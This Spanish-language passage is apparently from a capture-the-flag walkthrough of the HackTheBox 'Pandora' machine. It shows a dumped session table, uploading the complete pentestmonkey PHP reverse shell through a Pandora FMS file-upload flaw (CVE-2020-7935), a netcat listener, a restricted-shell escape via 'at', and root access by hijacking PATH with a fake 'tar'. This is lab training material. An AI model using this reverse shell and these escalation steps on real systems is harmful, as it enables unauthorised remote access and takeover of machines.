h96sol9n6q5pbanegdsbrhi5ms | NULL                                                                                                   | 1652781219  |<br>| he4gvhnc4pab73a4r7pnpbm0cf | NULL                                                                                                   | 1652781837  |<br>| heasjj8c48ikjlvsf1uhonfesv | NULL                                                                                                   | 1638540345  |<br>| hk7jt2ndo5utobp7ngnejohba8 | NULL                                                                                                   | 1652778559  |<br>| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638168492  |<br>| i1ngcqlce4kq4bha778mvnchs7 | NULL                                                                                                   | 1652805697  |<br>| i7akma8c8dg9624oe7hvuh6471 | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;                                                                                | 1652802345  |<br>| ifsvc1vpjd6gc76ep259mn1037 | NULL                                                                                                   | 1652802873  |<br>| iq3u0tngjruvva8976elc66t27 | id_usuario|s:4:<span class="hljs-string">&quot;matt&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                    | 1652789926  |<br>| iqo7opnt73a963m19q13u1l2lq | NULL                                                                                                   | 1652777047  |<br>| jc3gl5uot68g6ult24c1qenbno | NULL                                                                                                   | 1652805843  |<br>| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638456173  |<br>| jgj7lnr8npvhv1hf7npvprl861 | alert_msg|a:0:&#123;&#125;new_chat|b:0;id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;                                                   | 1652781437  |<br>| jl98npvmiokgaamnf9jfvv674o | NULL                                                                                                   | 1652783116  |<br>| jmvclcgpr3slvk5ab0ou7ndu43 | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652793040  |<br>| jnosdtjpbqh1903eg4e3jc40ab | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1652784666  |<br>| jp4t4emcn4v86se9gb5mkugofc | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652792591  |<br>| k473nc3sa1uh33ntv4eoa4br5r | NULL                                                                                                   | 1652785007  |<br>| k8s1g945uc3de37oqug4bqvd9b | NULL                                                                                                   | 1652782052  |<br>| kdf7e56o8f6qhonvp6pphmse13 | NULL                                                                                                   | 1652780763  |<br>| kenc5bf6l6es4g7sgbb2tk8mid | NULL                                                                                                   | 1652777654  |<br>| kh6cqaichfi16k923rtm10re06 | NULL                                                                                                   | 1652775061  |<br>| kp90bu1mlclbaenaljem590ik3 | NULL                                                                                                   | 1638787808  |<br>| l3tp4brg3iukt26s3sqq740qfl | NULL                                                                                                   | 1652805904  |<br>| lp862v0bi0osq7eq1gvcqo3cr0 | NULL                                                                                                   | 1652794503  |<br>| m3vs7nm14fuaqgatsbkeb6n2uj | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652790220  |<br>| mc85t3vg28t2jo8s3ri721f9pi | NULL                                                                                                   | 1652781884  |<br>| mfesvbk82a8lv1odnchpm7ec6u | NULL                                                                                                   | 1652779486  |<br>| mj1j6voq6b9vsnp477aneu297o | NULL                                                                                                   | 1652783155  |<br>| msvhkpq2up4h5klb5clqdo6kjs | NULL                                                                                                   | 1652776688  |<br>| munuvhe9rmifgi6cv0rsnss6rt | NULL                                                                                                   | 1652782038  |<br>| najitbt65do8l6slc5jlop6oc4 | NULL                                                                                                   | 1652779211  |<br>| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                                                                   | 1638796348  |<br>| nem2ru4vp2d0qnhii06cfhtvgc | NULL                                                                                                   | 1652804171  |<br>| nj2si1idkou7kosrq3jl0g4k44 | NULL                                                                                                   | 1652778762  |<br>| o29kd9notpn45p5ng6ub3bq4ar | NULL                                                                                                   | 1652783398  |<br>| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638540482  |<br>| o9pb09fq4na23chkmacklpd9k1 | NULL                                                                                                   | 1652783611  |<br>| oce1cf1nd4ftegkn7skopooma3 | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1652779802  |<br>| og63eqgbdi5h368asp3p0kf665 | NULL                                                                                                   | 1652804177  |<br>| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1637667827  |<br>| ometqgtpnpe5nn4qjvhugtee1h | NULL                                                                                                   | 1652785029  |<br>| oo58528sk55c75k7tlarpllqdc | NULL                                                                                                   | 1652779894  |<br>| opdlfsgi44qrurk17aqj05938v | NULL                                                                                                   | 1652790060  |<br>| p1bjeego8e0m3q5fjdhsihb0kc | NULL                                                                                                   | 1652778127  |<br>| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638168416  |<br>| q6f438nkkbs2rekv4oq5753bn6 | NULL                                                                                                   | 1652803291  |<br>| qbnu5cfa2qbinflfj6gmjrfslk | NULL                                                                                                   | 1652789312  |<br>| qnum0qub43v5l8ig0m68a13i1n | NULL                                                                                                   | 1652805817  |<br>| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                                                                   | 1638787723  |<br>| qqgl3gjqboqpmt6rhcrq1cd0rk | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1652802916  |<br>| r097jr6k9s7k166vkvaj17na1u | NULL                                                                                                   | 1638787677  |<br>| r1rkas9irgek3kesro2chs055b | NULL                                                                                                   | 1652803984  |<br>| r3jb5rbnluu12fn66l38fg8ld4 | NULL                                                                                                   | 1652783509  |<br>| r73jkkdu5pudlurobrpso60hag | NULL                                                                                                   | 1652789994  |<br>| r9ggd11htjo9vr7hvhd072vobe | NULL                                                                                                   | 1652781374  |<br>| rcd0gemr2fs68h5su7gej25p17 | NULL                                                                                                   | 1652779960  |<br>| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638889082  |<br>| ro8odpl6974ec916oirrufatj0 | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652790631  |<br>| rsrfvgtgc22mqhkkr93khhh4h9 | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652791278  |<br>| s7nbqeseh2o4tm55rsie6b66c1 | NULL                                                                                                   | 1652780763  |<br>| sopeddle9tdvobd8t28sjf6d50 | NULL                                                                                                   | 1652790501  |<br>| tht9be5v9iq97odk04pasu922h | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652795188  |<br>| tp1gd4gp5lia9nki704edi0qul | NULL                                                                                                   | 1652804255  |<br>| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638547193  |<br>| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1638793297  |<br>| ualed6qgo2futoegco0j4fu0bc | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652795842  |<br>| uc6bkkamoe7p0khktcdqnmcm95 | id_usuario|s:6:<span class="hljs-string">&quot;daniel&quot;</span>;                                                                               | 1652803951  |<br>| uglco9ek57j13c54iqvl0rpcvf | NULL                                                                                                   | 1652777855  |<br>| ukf3pi9olb510fcjt3e0ipq39o | NULL                                                                                                   | 1652803250  |<br>| ul9kl9fm1np9ag4ko90mobdgv9 | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652790411  |<br>| unpviign3vlhn99a56l9sg8ghe | NULL                                                                                                   | 1652783145  |<br>| utiegmf5amff4dneg1d5svoehv | NULL                                                                                                   | 1652783217  |<br>| vhj8v64400nh42fa3qnuqa8274 | NULL                                                                                                   | 1652779486  |<br>| vk0iqqad4a779o7234a6o7qki5 | NULL                                                                                                   | 1652805996  |<br>| vm1g6bff03u86705acdvt7jvf2 | NULL                                                                                                   | 1652777047  |<br>| vpg0p552d925lebu807n2lcjp0 | id_usuario|s:5:<span class="hljs-string">&quot;admin&quot;</span>;alert_msg|a:0:&#123;&#125;new_chat|b:0;                                                   | 1652793555  |<br>| vu974m0pjfv62iei9hek3tvmoj | NULL                                                                                                   | 1652803468  |<br>+----------------------------+--------------------------------------------------------------------------------------------------------+-------------+<br></code></pre></td></tr></table></figure><p>Si nos fijamos, estos <strong>sessions_id</strong> son los que se usa en el CVE explicado en el método anterior cuando esta decodeado.</p><h3 id="3-RevShell-de-Matt"><a href="#3-RevShell-de-Matt" class="headerlink" title="3. RevShell de Matt"></a>3. RevShell de Matt</h3><p>Lista de vulnerabilidades de Pandora FMS descubiertas hasta la fecha: <a href="https://pandorafms.com/en/security/common-vulnerabilities-and-exposures/">https://pandorafms.com/en/security/common-vulnerabilities-and-exposures/</a></p><p>Buscando diferentes vulnerabilidades sobre el software Pandora FMS, descubrí el CVE-2020-7935 que te permite subir ficheros maliciosos al servidor a través del <strong>File Manager</strong> de la aplicación. Si quereis más detalles de la vulnerabilidad, os dejo el siguiente enlace: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7935">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7935</a> .</p><p><img src="/img/Walkthrough/HTB/Pandora/file_manager.png" alt="Figura 6: Subir fichero malicioso a través de File Manager"></p><p>Para ello, he tenido que crearme una <strong>reverse shell</strong> en php como esta:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>// php-reverse-shell - A Reverse Shell implementation <span class="hljs-keyword">in</span> PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php<br>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net<br><br>set_time_limit (0);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;&lt;IP&gt;&#x27;</span>;<br><span class="hljs-variable">$port</span> = &lt;PORT&gt;;<br><span class="hljs-variable">$chunk_size</span> = 1400;<br><span class="hljs-variable">$write_a</span> = null;<br><span class="hljs-variable">$error_a</span> = null;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = 0;<br><span class="hljs-variable">$debug</span> = 0;<br><br><span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br>        <span class="hljs-variable">$pid</span> = pcntl_fork();<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -1) &#123;<br>                printit(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(1);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br>                <span class="hljs-built_in">exit</span>(0);  // Parent exits<br>        &#125;<br>        <span class="hljs-keyword">if</span> (posix_setsid() == -1) &#123;<br>                printit(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(1);<br>        &#125;<br><br>        <span class="hljs-variable">$daemon</span> = 1;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        printit(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><br><span class="hljs-built_in">umask</span>(0);<br><br>// Open reverse connection<br><span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br>        printit(<span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (<span class="hljs-variable">$errno</span>)&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(1);<br>&#125;<br><br><span class="hljs-variable">$descriptorspec</span> = array(<br>   0 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="hljs-built_in">read</span> from<br>   1 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to<br>   2 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to<br>);<br><br><span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$process</span>)) &#123;<br>        printit(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(1);<br>&#125;<br><br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[0], 0);<br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[1], 0);<br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[2], 0);<br>stream_set_blocking(<span class="hljs-variable">$sock</span>, 0);<br><br>printit(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-variable">$ip</span>:<span class="hljs-variable">$port</span>&quot;</span>);<br><br><span class="hljs-keyword">while</span> (1) &#123;<br>        <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$sock</span>)) &#123;<br>                printit(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br>                <span class="hljs-built_in">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$pipes</span>[1])) &#123;<br>                printit(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br>                <span class="hljs-built_in">break</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$read_a</span> = array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$pipes</span>[2]);<br>        <span class="hljs-variable">$num_changed_sockets</span> = stream_select(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, null);<br><br>        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;SOCK: <span class="hljs-variable">$input</span>&quot;</span>);<br>                fwrite(<span class="hljs-variable">$pipes</span>[0], <span class="hljs-variable">$input</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDOUT: <span class="hljs-variable">$input</span>&quot;</span>);<br>                fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDERR: <span class="hljs-variable">$input</span>&quot;</span>);<br>                fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>        &#125;<br>&#125;<br><br>fclose(<span class="hljs-variable">$sock</span>);<br>fclose(<span class="hljs-variable">$pipes</span>[0]);<br>fclose(<span class="hljs-variable">$pipes</span>[1]);<br>fclose(<span class="hljs-variable">$pipes</span>[2]);<br>proc_close(<span class="hljs-variable">$process</span>);<br><br><span class="hljs-keyword">function</span> printit (<span class="hljs-variable">$string</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br>                <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;<span class="hljs-variable">$string</span>\n&quot;</span>;<br>        &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>Y nos ponemos a la escucha con <strong>netcat</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp &lt;PORT&gt;<br></code></pre></td></tr></table></figure><p>Una vez subido el fichero, si accedemos a la ruta: <a href="http://localhost:1234/pandora_console/images/">http://localhost:1234/pandora_console/images/</a> y buscamos el fichero php que hemos subido previamente, ganaremos acceso al sistema como usuario Matt por el listener.</p><p><img src="/img/Walkthrough/HTB/Pandora/images.png" alt="Figura 7: Acceso a /images de Pandora"></p><h3 id="4-Obtener-user-txt"><a href="#4-Obtener-user-txt" class="headerlink" title="4. Obtener user.txt"></a>4. Obtener user.txt</h3><p>Una vez ganamos el acceso, podemos comprobar que realmente somos el usuario Matt (el que ha corrido el servidor web de Pandora FMS).</p><p><img src="/img/Walkthrough/HTB/Pandora/matt.png" alt="Figura 8: Acceso remoto como Matt"></p><p>Finalmente, utilizando el comando cat, obtenemos la user flag.<br>Input:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ cat <span class="hljs-regexp">/home/m</span>att/user.txt<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">f881ee92d<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">***</span> USER FLAG<br></code></pre></td></tr></table></figure><p>(PD: Si no se entiende la explicación, os dejo un enlace a un video que explica perfectamente como explotar la vulnerabilidad: <a href="https://www.youtube.com/watch?v=3msKWLid5dY">https://www.youtube.com/watch?v=3msKWLid5dY</a>)</p><h2 id="Task-4-Escalada-de-privilegios"><a href="#Task-4-Escalada-de-privilegios" class="headerlink" title="Task 4 - Escalada de privilegios"></a>Task 4 - Escalada de privilegios</h2><p>Primero de todo, la terminal que hemos obtenido es muy limitada. Por esa razón, aprovechando que tenemos el puerto 22 de SSH abierto, vamos a conectarnos al usuario Matt mediante ssh y garantizar que no se nos corta la conexión de manera random.</p><h3 id="1-Tratamiento-de-la-TTY"><a href="#1-Tratamiento-de-la-TTY" class="headerlink" title="1. Tratamiento de la TTY"></a>1. Tratamiento de la TTY</h3><p>Como podemos comprobar, la consola que hemos obtenido esta muy limitada. Por esa razón, haremos un tratamiento de la TTY.</p><p>Primero de todo deberemos salir de esta shell restringida. Para ello, si ejecutamos el comando, podemos ver que binarios tienen permisos de SUID.</p><p>Input:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm /</span><span class="hljs-number">4000</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> | xargs ls -la<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tap">-rwsr-sr-x<span class="hljs-number"> 1 </span>daemon daemon     <span class="hljs-number"> 55560 </span>Nov<span class="hljs-number"> 12 </span><span class="hljs-number"> 2018 </span>/usr/bin/at<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 85064 </span>Jul<span class="hljs-number"> 14 </span><span class="hljs-number"> 2021 </span>/usr/bin/chfn<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 53040 </span>Jul<span class="hljs-number"> 14 </span><span class="hljs-number"> 2021 </span>/usr/bin/chsh<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 39144 </span>Mar <span class="hljs-number"> 7 </span><span class="hljs-number"> 2020 </span>/usr/bin/fusermount<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 88464 </span>Jul<span class="hljs-number"> 14 </span><span class="hljs-number"> 2021 </span>/usr/bin/gpasswd<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 55528 </span>Jul<span class="hljs-number"> 21 </span><span class="hljs-number"> 2020 </span>/usr/bin/mount<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 44784 </span>Jul<span class="hljs-number"> 14 </span><span class="hljs-number"> 2021 </span>/usr/bin/newgrp<br>-rwsr-x---<span class="hljs-number"> 1 </span>root   matt       <span class="hljs-number"> 16816 </span>Dec <span class="hljs-number"> 3 </span>15:58 /usr/bin/pandora_backup<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 68208 </span>Jul<span class="hljs-number"> 14 </span><span class="hljs-number"> 2021 </span>/usr/bin/passwd<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 31032 </span>May<span class="hljs-number"> 26 </span><span class="hljs-number"> 2021 </span>/usr/bin/pkexec<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 67816 </span>Jul<span class="hljs-number"> 21 </span><span class="hljs-number"> 2020 </span>/usr/bin/su<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root      <span class="hljs-number"> 166056 </span>Jan<span class="hljs-number"> 19 </span><span class="hljs-number"> 2021 </span>/usr/bin/sudo<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 39144 </span>Jul<span class="hljs-number"> 21 </span><span class="hljs-number"> 2020 </span>/usr/bin/umount<br>-rwsr-xr--<span class="hljs-number"> 1 </span>root   messagebus <span class="hljs-number"> 51344 </span>Jun<span class="hljs-number"> 11 </span><span class="hljs-number"> 2020 </span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 14488 </span>Jul <span class="hljs-number"> 8 </span><span class="hljs-number"> 2019 </span>/usr/lib/eject/dmcrypt-get-device<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root      <span class="hljs-number"> 473576 </span>Jul<span class="hljs-number"> 23 </span><span class="hljs-number"> 2021 </span>/usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 22840 </span>May<span class="hljs-number"> 26 </span><span class="hljs-number"> 2021 </span>/usr/lib/policykit-1/polkit-agent-helper-1<br></code></pre></td></tr></table></figure><p>Dado que ninguno de estos binarios nos permiten obtener privilegios de root, según la web <a href="https://gtfobins.github.io/gtfobins/at/">https://gtfobins.github.io/gtfobins/at/</a> con el binario <strong>/usr/bin/at</strong> podemos salir de la shell restringida.</p><p>Los pasos para tratar la TTY son los siguientes:</p><ol><li>script /dev/null -c bash</li><li>echo “/bin/sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)” | at now; tail -f /dev/null</li><li>export TERM=xterm-256color</li><li>script /dev/null -c bash</li><li>export HOME=/home/matt</li><li>Ctrl + Z</li><li>stty raw -echo; fg</li><li>reset</li></ol><p>De esta forma ya podemos movernos libremente por la terminal de matt.</p><h3 id="2-Analizar-usr-bin-pandora-backup"><a href="#2-Analizar-usr-bin-pandora-backup" class="headerlink" title="2. Analizar /usr/bin/pandora_backup"></a>2. Analizar /usr/bin/pandora_backup</h3><p>Si nos fijamos en el output anterior, <strong>/usr/bin/pandora_backup</strong> tiene permisos de propietario root, pero también de grupo matt. Lo cual es sospechoso.</p><p>Si ejecutamos dicho binario, veremos que hace un backup de toda la ruta <strong>/var/www/pandora/pandora_console/</strong>.<br>Sin embargo, obtenemos el siguiente error al principio de la ejecución.</p><p><img src="/img/Walkthrough/HTB/Pandora/vuln_backup.png" alt="Figura 9: Ejecución de /usr/bin/pandora_backup"></p><p>Si logramos modificar este binario <strong>tar</strong> para que haga otra cosa que no sea la función original, podemos utilizarlo para escalar privilegios.</p><h3 id="3-Envenenamiento-del-binario-TAR"><a href="#3-Envenenamiento-del-binario-TAR" class="headerlink" title="3. Envenenamiento del binario TAR"></a>3. Envenenamiento del binario TAR</h3><p>Para envenenar el fichero tar, primero debemos encontrar un directorio el cual tengamos permisos de escritura, como suele ser el caso de <strong>/temp</strong>.</p><p>Una vez estemos en dicho directorio, adjunto una imagen con los pasos a seguir para envenenar el fichero.</p><p><img src="/img/Walkthrough/HTB/Pandora/tar.png" alt="Figura 10: Envenenamiento de TAR"></p><p>Basicamente hemos modificado tar para que sea igual a invocar una bash -&gt; /bin/bash<br>Y finalmente agregamos el directorio <strong>/tmp</strong> a la variable <strong>$PATH</strong>. De esa forma, buscará primero en /tmp el binario TAR que en la ruta original.</p><h3 id="4-Obtener-root-txt"><a href="#4-Obtener-root-txt" class="headerlink" title="4. Obtener root.txt"></a>4. Obtener root.txt</h3><p>Finalmente, si ejecutamos de nuevo el binario <strong>/usr/bin/pandora_backup</strong> veremos que en cuanto llama al principio a la función tar, esta nos devuelve una bash como usuario root.</p><p><img 